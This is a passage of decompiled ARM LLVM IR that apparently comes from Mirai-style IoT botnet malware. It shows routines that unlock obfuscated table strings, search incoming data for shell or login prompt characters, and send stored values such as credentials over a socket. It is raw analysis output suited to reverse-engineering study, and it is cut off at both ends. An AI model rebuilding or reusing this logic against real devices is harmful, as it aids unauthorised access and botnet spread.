  %v1_1070c11891194 = load i32, i32* @r6, align 4
  %v2_1070c11901195 = add i32 %v1_1070c11891194, 4
  %v3_1070c11911196 = inttoptr i32 %v2_1070c11901195 to i32*
  store i32 -1, i32* %v3_1070c11911196, align 4
  br label %bb1934

bb1933:                                           ; preds = %dec_label_pc_106e8
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1070c1185 = load i32, i32* @r6, align 4
  %v2_1070c1186 = add i32 %v1_1070c1185, 4
  %v3_1070c1187 = inttoptr i32 %v2_1070c1186 to i32*
  store i32 -1, i32* %v3_1070c1187, align 4
  %v4_10710 = load i32, i32* %r3.global-to-local, align 4
  %v5_10710 = load i32, i32* @r6, align 4
  %v6_10710 = add i32 %v5_10710, 12
  %v7_10710 = inttoptr i32 %v6_10710 to i32*
  store i32 %v4_10710, i32* %v7_10710, align 4
  %v4_10714 = load i32, i32* %r3.global-to-local, align 4
  %v5_10714 = trunc i32 %v4_10714 to i8
  %v6_10714 = load i32, i32* @r6, align 4
  %v7_10714 = add i32 %v6_10714, 284
  %v8_10714 = inttoptr i32 %v7_10714 to i8*
  store i8 %v5_10714, i8* %v8_10714, align 1
  %v0_10718.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10718.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb1934

bb1934:                                           ; preds = %.thread1193, %bb1933
  %v1_1071c = phi i1 [ %v1_10718.pre, %bb1933 ], [ %v0_10708, %.thread1193 ]
  %v0_1071c = phi i1 [ %v0_10718.pre, %bb1933 ], [ %v1_10708, %.thread1193 ]
  %v2_10718 = xor i1 %v1_1071c, true
  %v3_10718 = or i1 %v0_1071c, %v2_10718
  br i1 %v3_10718, label %bb1935, label %bb1936

bb1935:                                           ; preds = %bb1934
  %v4_10718 = load i32, i32* @r6, align 4
  store i32 %v4_10718, i32* %r0.global-to-local, align 4
  br label %bb1936

bb1936:                                           ; preds = %bb1934, %bb1935
  store i32 67360, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10718, i32 ptrtoint (i32* @global_var_e1dc.222 to i32))
  br label %dec_label_pc_10720

dec_label_pc_10720:                               ; preds = %dec_label_pc_10618.loopexit, %dec_label_pc_1061c.backedge, %dec_label_pc_10618.preheader, %dec_label_pc_106dc, %dec_label_pc_10600, %dec_label_pc_105b8, %dec_label_pc_111a8, %bb1936
  %v3_10720 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10720, i32* %r3.global-to-local, align 4
  %v1_10724 = add i32 %v3_10720, 1
  store i32 %v1_10724, i32* @r4, align 4
  %v2_10728 = icmp ugt i32 %v1_10724, 254
  store i1 %v2_10728, i1* %cpsr_c.global-to-local, align 1
  %v7_10728 = icmp eq i32 %v1_10724, 255
  store i1 %v7_10728, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10724, i32* %stack_var_-52, align 4
  %v7_10730 = icmp slt i32 %v1_10724, 256
  br i1 %v7_10730, label %dec_label_pc_105b8, label %dec_label_pc_e810

dec_label_pc_10738:                               ; preds = %dec_label_pc_10698
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_1073c = call i32 @table_unlock_val(i32 10)
  store i32 %v2_10d7c, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_1074c = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  %v3_10750 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_1074c, i32* %r2.global-to-local, align 4
  %v1_10758 = add i32 %v3_10750, -1
  store i32 %v1_10758, i32* %r3.global-to-local, align 4
  %v0_1075c = load i32, i32* @sl, align 4
  store i32 %v0_1075c, i32* %r0.global-to-local, align 4
  %v0_10760 = load i32, i32* @r6, align 4
  %v1_10760 = add i32 %v0_10760, 24
  %v2_10760 = inttoptr i32 %v1_10760 to i32*
  %v3_10760 = load i32, i32* %v2_10760, align 4
  store i32 %v3_10760, i32* %r1.global-to-local, align 4
  %v4_10764 = call i32 @util_memsearch(i32 %v0_1075c, i32 %v3_10760, i32 %v3_1074c, i32 %v1_10758)
  %v2_10768 = icmp eq i32 %v4_10764, -1
  store i1 %v2_10768, i1* %cpsr_c.global-to-local, align 1
  %v7_10768 = icmp eq i32 %v4_10764, -1
  store i1 %v7_10768, i1* %cpsr_z.global-to-local, align 1
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_11100 = call i32 @table_lock_val(i32 10)
  br i1 %v7_10768, label %dec_label_pc_110fc, label %dec_label_pc_10770

dec_label_pc_10770:                               ; preds = %dec_label_pc_10738
  store i32 %v1_11100, i32* %r0.global-to-local, align 4
  %v0_10778 = load i32, i32* @r6, align 4
  %v1_10778 = add i32 %v0_10778, 4
  %v2_10778 = inttoptr i32 %v1_10778 to i32*
  %v3_10778 = load i32, i32* %v2_10778, align 4
  store i32 %v3_10778, i32* %r0.global-to-local, align 4
  %v1_1077c = call i32 @__GI___libc_close(i32 %v3_10778)
  store i32 %v1_1077c, i32* %r0.global-to-local, align 4
  %v0_10780 = load i32, i32* @r6, align 4
  %v1_10780 = add i32 %v0_10780, 284
  %v2_10780 = inttoptr i32 %v1_10780 to i8*
  %v3_10780 = load i8, i8* %v2_10780, align 1
  %v4_10780 = zext i8 %v3_10780 to i32
  %v1_10784 = add nuw nsw i32 %v4_10780, 1
  %v1_10788 = urem i32 %v1_10784, 256
  store i32 %v1_10788, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10790 = icmp ugt i32 %v1_10788, 9
  store i1 %v2_10790, i1* %cpsr_c.global-to-local, align 1
  %v7_10790 = icmp eq i32 %v1_10788, 10
  store i1 %v7_10790, i1* %cpsr_z.global-to-local, align 1
  %v2_10794 = add i32 %v0_10780, 4
  %v3_10794 = inttoptr i32 %v2_10794 to i32*
  store i32 -1, i32* %v3_10794, align 4
  %v0_10798 = load i32, i32* @r3, align 4
  %v1_10798 = trunc i32 %v0_10798 to i8
  %v2_10798 = load i32, i32* @r6, align 4
  %v3_10798 = add i32 %v2_10798, 284
  %v4_10798 = inttoptr i32 %v3_10798 to i8*
  store i8 %v1_10798, i8* %v4_10798, align 1
  %v0_1079c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1079c, label %dec_label_pc_107a0, label %dec_label_pc_10fa8

dec_label_pc_107a0:                               ; preds = %dec_label_pc_10770
  store i32 0, i32* @r3, align 4
  %v1_107a4 = load i32, i32* @r6, align 4
  %v2_107a4 = add i32 %v1_107a4, 12
  %v3_107a4 = inttoptr i32 %v2_107a4 to i32*
  store i32 0, i32* %v3_107a4, align 4
  %v0_107a8 = load i32, i32* @r3, align 4
  %v1_107a8 = trunc i32 %v0_107a8 to i8
  %v2_107a8 = load i32, i32* @r6, align 4
  %v3_107a8 = add i32 %v2_107a8, 284
  %v4_107a8 = inttoptr i32 %v3_107a8 to i8*
  store i8 %v1_107a8, i8* %v4_107a8, align 1
  br label %dec_label_pc_107ac

dec_label_pc_107ac:                               ; preds = %dec_label_pc_10fa8, %dec_label_pc_107a0
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_107b0

dec_label_pc_107b0:                               ; preds = %.thread1199, %dec_label_pc_10e88, %dec_label_pc_10ad0, %dec_label_pc_109fc, %dec_label_pc_10928, %dec_label_pc_10854, %dec_label_pc_107ac
  %v0_107b0 = load i32, i32* @r6, align 4
  %v1_107b0 = add i32 %v0_107b0, 24
  %v2_107b0 = inttoptr i32 %v1_107b0 to i32*
  %v3_107b0 = load i32, i32* %v2_107b0, align 4
  %v0_107b4 = load i32, i32* @r7, align 4
  %v2_107b4 = sub i32 %v0_107b4, %v3_107b0
  %v3_107b4 = icmp uge i32 %v0_107b4, %v3_107b0
  store i1 %v3_107b4, i1* %cpsr_c.global-to-local, align 1
  %v4_107b4 = xor i32 %v0_107b4, %v3_107b0
  %v5_107b4 = xor i32 %v2_107b4, %v0_107b4
  %v6_107b4 = and i32 %v5_107b4, %v4_107b4
  %v7_107b4 = icmp slt i32 %v6_107b4, 0
  %v8_107b4 = icmp slt i32 %v2_107b4, 0
  %v9_107b4 = icmp eq i32 %v0_107b4, %v3_107b0
  store i1 %v9_107b4, i1* %cpsr_z.global-to-local, align 1
  %v2_107b8 = xor i1 %v8_107b4, %v7_107b4
  %v0_107b4.v3_107b0 = select i1 %v2_107b8, i32 %v0_107b4, i32 %v3_107b0
  store i32 %v0_107b4.v3_107b0, i32* %r1.global-to-local, align 4
  %v2_107c0 = sub i32 %v3_107b0, %v0_107b4.v3_107b0
  store i32 %v2_107c0, i32* @r2, align 4
  store i32 %v2_107c0, i32* %v2_107b0, align 4
  %v0_107c8 = load i32, i32* @sl, align 4
  %v1_107c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_107c8 = add i32 %v1_107c8, %v0_107c8
  store i32 %v2_107c8, i32* @r1, align 4
  store i32 %v0_107c8, i32* @r0, align 4
  %v3_107d0 = call i32 @memmove(i32 %v0_107c8, i32 %v2_107c8, i32 %v2_107c0)
  store i32 %v3_107d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10698

dec_label_pc_107d8:                               ; preds = %dec_label_pc_10698
  %v1_107d8 = add i32 %v0_10698, 24
  %v2_107d8 = inttoptr i32 %v1_107d8 to i32*
  %v3_107d8 = load i32, i32* %v2_107d8, align 4
  store i32 %v3_107d8, i32* %r2.global-to-local, align 4
  %v1_107dc = add i32 %v3_107d8, -1
  store i32 %v1_107dc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_107e0 = icmp eq i32 %v1_107dc, 0
  store i1 %v2_107e0, i1* %cpsr_z.global-to-local, align 1
  %tmp1939 = icmp slt i32 %v1_107dc, 1
  br i1 %tmp1939, label %dec_label_pc_1061c.backedge.thread, label %dec_label_pc_107e8

dec_label_pc_107e8:                               ; preds = %dec_label_pc_107d8
  %v2_107e8 = add i32 %v1_107dc, %v0_10698
  store i32 %v2_107e8, i32* %r3.global-to-local, align 4
  %v1_107ec = add i32 %v2_107e8, 28
  %v2_107ec = inttoptr i32 %v1_107ec to i8*
  %v3_107ec = load i8, i8* %v2_107ec, align 1
  %v4_107ec = zext i8 %v3_107ec to i32
  store i32 %v4_107ec, i32* %r3.global-to-local, align 4
  %v2_107f0 = icmp ugt i8 %v3_107ec, 61
  store i1 %v2_107f0, i1* %cpsr_c.global-to-local, align 1
  %v7_107f0 = icmp eq i8 %v3_107ec, 62
  store i1 %v7_107f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107f0, label %dec_label_pc_10854, label %bb1940

bb1940:                                           ; preds = %dec_label_pc_107e8
  %v3_107f4 = icmp ugt i8 %v3_107ec, 57
  store i1 %v3_107f4, i1* %cpsr_c.global-to-local, align 1
  %v8_107f4 = icmp eq i8 %v3_107ec, 58
  store i1 %v8_107f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107f4, label %dec_label_pc_10854, label %dec_label_pc_107fc

dec_label_pc_107fc:                               ; preds = %bb1940
  %v2_107fc = icmp ugt i8 %v3_107ec, 35
  store i1 %v2_107fc, i1* %cpsr_c.global-to-local, align 1
  %v7_107fc = icmp eq i8 %v3_107ec, 36
  store i1 %v7_107fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107fc, label %dec_label_pc_10854, label %dec_label_pc_10804

dec_label_pc_10804:                               ; preds = %dec_label_pc_107fc
  %v2_10804 = icmp ugt i8 %v3_107ec, 34
  store i1 %v2_10804, i1* %cpsr_c.global-to-local, align 1
  %v7_10804 = icmp eq i8 %v3_107ec, 35
  store i1 %v7_10804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10804, label %dec_label_pc_10854, label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %dec_label_pc_10804
  %v2_1080c = icmp ugt i8 %v3_107ec, 36
  store i1 %v2_1080c, i1* %cpsr_c.global-to-local, align 1
  %v7_1080c = icmp eq i8 %v3_107ec, 37
  store i1 %v7_1080c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1080c, label %dec_label_pc_10854, label %dec_label_pc_10838.preheader

dec_label_pc_10838.preheader:                     ; preds = %dec_label_pc_1080c
  %v3_10810 = add i32 %v0_10698, 28
  %v2_10814 = add i32 %v3_10810, %v3_107d8
  store i32 %v2_10814, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10838

dec_label_pc_10820:                               ; preds = %bb1941
  %v2_10820 = icmp ugt i8 %v3_10840, 35
  store i1 %v2_10820, i1* %cpsr_c.global-to-local, align 1
  %v7_10820 = icmp eq i8 %v3_10840, 36
  store i1 %v7_10820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10820, label %dec_label_pc_10854, label %dec_label_pc_10828

dec_label_pc_10828:                               ; preds = %dec_label_pc_10820
  %v2_10828 = icmp ugt i8 %v3_10840, 34
  store i1 %v2_10828, i1* %cpsr_c.global-to-local, align 1
  %v7_10828 = icmp eq i8 %v3_10840, 35
  store i1 %v7_10828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10828, label %dec_label_pc_10854, label %dec_label_pc_10830

dec_label_pc_10830:                               ; preds = %dec_label_pc_10828
  %v2_10830 = icmp ugt i8 %v3_10840, 36
  store i1 %v2_10830, i1* %cpsr_c.global-to-local, align 1
  %v7_10830 = icmp eq i8 %v3_10840, 37
  store i1 %v7_10830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10830, label %dec_label_pc_10854, label %dec_label_pc_10838

dec_label_pc_10838:                               ; preds = %dec_label_pc_10838.preheader, %dec_label_pc_10830
  %v0_1084c681 = phi i32 [ %v2_10814, %dec_label_pc_10838.preheader ], [ %v1_1084c, %dec_label_pc_10830 ]
  %v0_10838 = phi i32 [ %v1_107dc, %dec_label_pc_10838.preheader ], [ %v1_10838, %dec_label_pc_10830 ]
  %v1_10838 = add i32 %v0_10838, -1
  store i32 %v1_10838, i32* %r1.global-to-local, align 4
  %v2_10838 = icmp ne i32 %v0_10838, 0
  store i1 %v2_10838, i1* %cpsr_c.global-to-local, align 1
  %v7_10838 = icmp eq i32 %v0_10838, 1
  store i1 %v7_10838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10838, label %dec_label_pc_1061c.backedge.thread2185, label %dec_label_pc_10840

dec_label_pc_10840:                               ; preds = %dec_label_pc_10838
  %v1_10840 = add i32 %v0_1084c681, -2
  %v2_10840 = inttoptr i32 %v1_10840 to i8*
  %v3_10840 = load i8, i8* %v2_10840, align 1
  %v4_10840 = zext i8 %v3_10840 to i32
  store i32 %v4_10840, i32* %r2.global-to-local, align 4
  %v2_10844 = icmp ugt i8 %v3_10840, 61
  store i1 %v2_10844, i1* %cpsr_c.global-to-local, align 1
  %v7_10844 = icmp eq i8 %v3_10840, 62
  store i1 %v7_10844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10844, label %.thread680, label %bb1941

.thread680:                                       ; preds = %dec_label_pc_10840
  %v1_1084c682 = add i32 %v0_1084c681, -1
  store i32 %v1_1084c682, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10854

bb1941:                                           ; preds = %dec_label_pc_10840
  %v3_10848 = icmp ugt i8 %v3_10840, 57
  store i1 %v3_10848, i1* %cpsr_c.global-to-local, align 1
  %v8_10848 = icmp eq i8 %v3_10840, 58
  store i1 %v8_10848, i1* %cpsr_z.global-to-local, align 1
  %v1_1084c = add i32 %v0_1084c681, -1
  store i32 %v1_1084c, i32* %r3.global-to-local, align 4
  br i1 %v8_10848, label %dec_label_pc_10854, label %dec_label_pc_10820

dec_label_pc_10854:                               ; preds = %bb1941, %dec_label_pc_10830, %dec_label_pc_10828, %dec_label_pc_10820, %dec_label_pc_1080c, %dec_label_pc_107e8, %.thread680, %dec_label_pc_10804, %dec_label_pc_107fc, %bb1940
  %v0_10858 = phi i32 [ %v1_107dc, %dec_label_pc_1080c ], [ %v1_107dc, %dec_label_pc_107e8 ], [ %v1_10838, %.thread680 ], [ %v1_107dc, %dec_label_pc_10804 ], [ %v1_107dc, %dec_label_pc_107fc ], [ %v1_107dc, %bb1940 ], [ %v1_10838, %dec_label_pc_10820 ], [ %v1_10838, %dec_label_pc_10828 ], [ %v1_10838, %dec_label_pc_10830 ], [ %v1_10838, %bb1941 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10858 = add i32 %v0_10858, 1
  store i32 %v1_10858, i32* @r7, align 4
  %v1_1085c = call i32 @table_unlock_val(i32 8)
  store i32 %v2_10d7c, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_1086c = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_1086c, i32* %r0.global-to-local, align 4
  %v3_10870 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10870, i32* %r2.global-to-local, align 4
  store i32 %v3_1086c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1087c = load i32, i32* @r6, align 4
  %v1_1087c = add i32 %v0_1087c, 4
  %v2_1087c = inttoptr i32 %v1_1087c to i32*
  %v3_1087c = load i32, i32* %v2_1087c, align 4
  store i32 %v3_1087c, i32* %r0.global-to-local, align 4
  %v4_10880 = call i32 @__libc_send(i32 %v3_1087c, i32 %v3_1086c, i32 %v3_10870, i32 16384)
  store i32 %v4_10880, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10890 = load i32, i32* @r6, align 4
  %v1_10890 = add i32 %v0_10890, 4
  %v2_10890 = inttoptr i32 %v1_10890 to i32*
  %v3_10890 = load i32, i32* %v2_10890, align 4
  store i32 %v3_10890, i32* %r0.global-to-local, align 4
  %v4_10894 = call i32 @__libc_send(i32 %v3_10890, i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1089c = call i32 @table_lock_val(i32 8)
  store i32 %v1_1089c, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_108a4 = load i32, i32* @r6, align 4
  %v2_108a4 = add i32 %v1_108a4, 12
  %v3_108a4 = inttoptr i32 %v2_108a4 to i32*
  store i32 10, i32* %v3_108a4, align 4
  br label %dec_label_pc_107b0

dec_label_pc_108ac:                               ; preds = %dec_label_pc_10698
  %v1_108ac = add i32 %v0_10698, 24
  %v2_108ac = inttoptr i32 %v1_108ac to i32*
  %v3_108ac = load i32, i32* %v2_108ac, align 4
  store i32 %v3_108ac, i32* %r2.global-to-local, align 4
  %v1_108b0 = add i32 %v3_108ac, -1
  store i32 %v1_108b0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_108b4 = icmp eq i32 %v1_108b0, 0
  store i1 %v2_108b4, i1* %cpsr_z.global-to-local, align 1
  %tmp1942 = icmp slt i32 %v1_108b0, 1
  br i1 %tmp1942, label %dec_label_pc_1061c.backedge.thread, label %dec_label_pc_108bc

dec_label_pc_108bc:                               ; preds = %dec_label_pc_108ac
  %v2_108bc = add i32 %v1_108b0, %v0_10698
  store i32 %v2_108bc, i32* %r3.global-to-local, align 4
  %v1_108c0 = add i32 %v2_108bc, 28
  %v2_108c0 = inttoptr i32 %v1_108c0 to i8*
  %v3_108c0 = load i8, i8* %v2_108c0, align 1
  %v4_108c0 = zext i8 %v3_108c0 to i32
  store i32 %v4_108c0, i32* %r3.global-to-local, align 4
  %v2_108c4 = icmp ugt i8 %v3_108c0, 61
  store i1 %v2_108c4, i1* %cpsr_c.global-to-local, align 1
  %v7_108c4 = icmp eq i8 %v3_108c0, 62
  store i1 %v7_108c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108c4, label %dec_label_pc_10928, label %bb1943

bb1943:                                           ; preds = %dec_label_pc_108bc
  %v3_108c8 = icmp ugt i8 %v3_108c0, 57
  store i1 %v3_108c8, i1* %cpsr_c.global-to-local, align 1
  %v8_108c8 = icmp eq i8 %v3_108c0, 58
  store i1 %v8_108c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_108c8, label %dec_label_pc_10928, label %dec_label_pc_108d0

dec_label_pc_108d0:                               ; preds = %bb1943
  %v2_108d0 = icmp ugt i8 %v3_108c0, 35
  store i1 %v2_108d0, i1* %cpsr_c.global-to-local, align 1
  %v7_108d0 = icmp eq i8 %v3_108c0, 36
  store i1 %v7_108d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108d0, label %dec_label_pc_10928, label %dec_label_pc_108d8

dec_label_pc_108d8:                               ; preds = %dec_label_pc_108d0
  %v2_108d8 = icmp ugt i8 %v3_108c0, 34
  store i1 %v2_108d8, i1* %cpsr_c.global-to-local, align 1
  %v7_108d8 = icmp eq i8 %v3_108c0, 35
  store i1 %v7_108d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108d8, label %dec_label_pc_10928, label %dec_label_pc_108e0

dec_label_pc_108e0:                               ; preds = %dec_label_pc_108d8
  %v2_108e0 = icmp ugt i8 %v3_108c0, 36
  store i1 %v2_108e0, i1* %cpsr_c.global-to-local, align 1
  %v7_108e0 = icmp eq i8 %v3_108c0, 37
  store i1 %v7_108e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108e0, label %dec_label_pc_10928, label %dec_label_pc_1090c.preheader

dec_label_pc_1090c.preheader:                     ; preds = %dec_label_pc_108e0
  %v3_108e4 = add i32 %v0_10698, 28
  %v2_108e8 = add i32 %v3_108e4, %v3_108ac
  store i32 %v2_108e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1090c

dec_label_pc_108f4:                               ; preds = %bb1944
  %v2_108f4 = icmp ugt i8 %v3_10914, 35
  store i1 %v2_108f4, i1* %cpsr_c.global-to-local, align 1
  %v7_108f4 = icmp eq i8 %v3_10914, 36
  store i1 %v7_108f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108f4, label %dec_label_pc_10928, label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108f4
  %v2_108fc = icmp ugt i8 %v3_10914, 34
  store i1 %v2_108fc, i1* %cpsr_c.global-to-local, align 1
  %v7_108fc = icmp eq i8 %v3_10914, 35
  store i1 %v7_108fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108fc, label %dec_label_pc_10928, label %dec_label_pc_10904

dec_label_pc_10904:                               ; preds = %dec_label_pc_108fc
  %v2_10904 = icmp ugt i8 %v3_10914, 36
  store i1 %v2_10904, i1* %cpsr_c.global-to-local, align 1
  %v7_10904 = icmp eq i8 %v3_10914, 37
  store i1 %v7_10904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10904, label %dec_label_pc_10928, label %dec_label_pc_1090c

dec_label_pc_1090c:                               ; preds = %dec_label_pc_1090c.preheader, %dec_label_pc_10904
  %v0_10920688 = phi i32 [ %v2_108e8, %dec_label_pc_1090c.preheader ], [ %v1_10920, %dec_label_pc_10904 ]
  %v0_1090c = phi i32 [ %v1_108b0, %dec_label_pc_1090c.preheader ], [ %v1_1090c, %dec_label_pc_10904 ]
  %v1_1090c = add i32 %v0_1090c, -1
  store i32 %v1_1090c, i32* %r1.global-to-local, align 4
  %v2_1090c = icmp ne i32 %v0_1090c, 0
  store i1 %v2_1090c, i1* %cpsr_c.global-to-local, align 1
  %v7_1090c = icmp eq i32 %v0_1090c, 1
  store i1 %v7_1090c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1090c, label %dec_label_pc_1061c.backedge.thread2185, label %dec_label_pc_10914

dec_label_pc_10914:                               ; preds = %dec_label_pc_1090c
  %v1_10914 = add i32 %v0_10920688, -2
  %v2_10914 = inttoptr i32 %v1_10914 to i8*
  %v3_10914 = load i8, i8* %v2_10914, align 1
  %v4_10914 = zext i8 %v3_10914 to i32
  store i32 %v4_10914, i32* %r2.global-to-local, align 4
  %v2_10918 = icmp ugt i8 %v3_10914, 61
  store i1 %v2_10918, i1* %cpsr_c.global-to-local, align 1
  %v7_10918 = icmp eq i8 %v3_10914, 62
  store i1 %v7_10918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10918, label %.thread687, label %bb1944

.thread687:                                       ; preds = %dec_label_pc_10914
  %v1_10920689 = add i32 %v0_10920688, -1
  store i32 %v1_10920689, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10928

bb1944:                                           ; preds = %dec_label_pc_10914
  %v3_1091c = icmp ugt i8 %v3_10914, 57
  store i1 %v3_1091c, i1* %cpsr_c.global-to-local, align 1
  %v8_1091c = icmp eq i8 %v3_10914, 58
  store i1 %v8_1091c, i1* %cpsr_z.global-to-local, align 1
  %v1_10920 = add i32 %v0_10920688, -1
  store i32 %v1_10920, i32* %r3.global-to-local, align 4
  br i1 %v8_1091c, label %dec_label_pc_10928, label %dec_label_pc_108f4

dec_label_pc_10928:                               ; preds = %bb1944, %dec_label_pc_10904, %dec_label_pc_108fc, %dec_label_pc_108f4, %dec_label_pc_108e0, %dec_label_pc_108bc, %.thread687, %dec_label_pc_108d8, %dec_label_pc_108d0, %bb1943
  %v0_1092c = phi i32 [ %v1_108b0, %dec_label_pc_108e0 ], [ %v1_108b0, %dec_label_pc_108bc ], [ %v1_1090c, %.thread687 ], [ %v1_108b0, %dec_label_pc_108d8 ], [ %v1_108b0, %dec_label_pc_108d0 ], [ %v1_108b0, %bb1943 ], [ %v1_1090c, %dec_label_pc_108f4 ], [ %v1_1090c, %dec_label_pc_108fc ], [ %v1_1090c, %dec_label_pc_10904 ], [ %v1_1090c, %bb1944 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_1092c = add i32 %v0_1092c, 1
  store i32 %v1_1092c, i32* @r7, align 4
  %v1_10930 = call i32 @table_unlock_val(i32 7)
  store i32 %v2_10d7c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_10940 = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_10940, i32* %r0.global-to-local, align 4
  %v3_10944 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10944, i32* %r2.global-to-local, align 4
  store i32 %v3_10940, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10950 = load i32, i32* @r6, align 4
  %v1_10950 = add i32 %v0_10950, 4
  %v2_10950 = inttoptr i32 %v1_10950 to i32*
  %v3_10950 = load i32, i32* %v2_10950, align 4
  store i32 %v3_10950, i32* %r0.global-to-local, align 4
  %v4_10954 = call i32 @__libc_send(i32 %v3_10950, i32 %v3_10940, i32 %v3_10944, i32 16384)
  store i32 %v4_10954, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10964 = load i32, i32* @r6, align 4
  %v1_10964 = add i32 %v0_10964, 4
  %v2_10964 = inttoptr i32 %v1_10964 to i32*
  %v3_10964 = load i32, i32* %v2_10964, align 4
  store i32 %v3_10964, i32* %r0.global-to-local, align 4
  %v4_10968 = call i32 @__libc_send(i32 %v3_10964, i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_10970 = call i32 @table_lock_val(i32 7)
  store i32 %v1_10970, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_10978 = load i32, i32* @r6, align 4
  %v2_10978 = add i32 %v1_10978, 12
  %v3_10978 = inttoptr i32 %v2_10978 to i32*
  store i32 9, i32* %v3_10978, align 4
  br label %dec_label_pc_107b0

dec_label_pc_10980:                               ; preds = %dec_label_pc_10698
  %v1_10980 = add i32 %v0_10698, 24
  %v2_10980 = inttoptr i32 %v1_10980 to i32*
  %v3_10980 = load i32, i32* %v2_10980, align 4
  store i32 %v3_10980, i32* %r2.global-to-local, align 4
  %v1_10984 = add i32 %v3_10980, -1
  store i32 %v1_10984, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10988 = icmp eq i32 %v1_10984, 0
  store i1 %v2_10988, i1* %cpsr_z.global-to-local, align 1
  %tmp1945 = icmp slt i32 %v1_10984, 1
  br i1 %tmp1945, label %dec_label_pc_1061c.backedge.thread, label %dec_label_pc_10990

dec_label_pc_10990:                               ; preds = %dec_label_pc_10980
  %v2_10990 = add i32 %v1_10984, %v0_10698
  store i32 %v2_10990, i32* %r3.global-to-local, align 4
  %v1_10994 = add i32 %v2_10990, 28
  %v2_10994 = inttoptr i32 %v1_10994 to i8*
  %v3_10994 = load i8, i8* %v2_10994, align 1
  %v4_10994 = zext i8 %v3_10994 to i32
  store i32 %v4_10994, i32* %r3.global-to-local, align 4
  %v2_10998 = icmp ugt i8 %v3_10994, 61
  store i1 %v2_10998, i1* %cpsr_c.global-to-local, align 1
  %v7_10998 = icmp eq i8 %v3_10994, 62
  store i1 %v7_10998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10998, label %dec_label_pc_109fc, label %bb1946

bb1946:                                           ; preds = %dec_label_pc_10990
  %v3_1099c = icmp ugt i8 %v3_10994, 57
  store i1 %v3_1099c, i1* %cpsr_c.global-to-local, align 1
  %v8_1099c = icmp eq i8 %v3_10994, 58
  store i1 %v8_1099c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1099c, label %dec_label_pc_109fc, label %dec_label_pc_109a4

dec_label_pc_109a4:                               ; preds = %bb1946
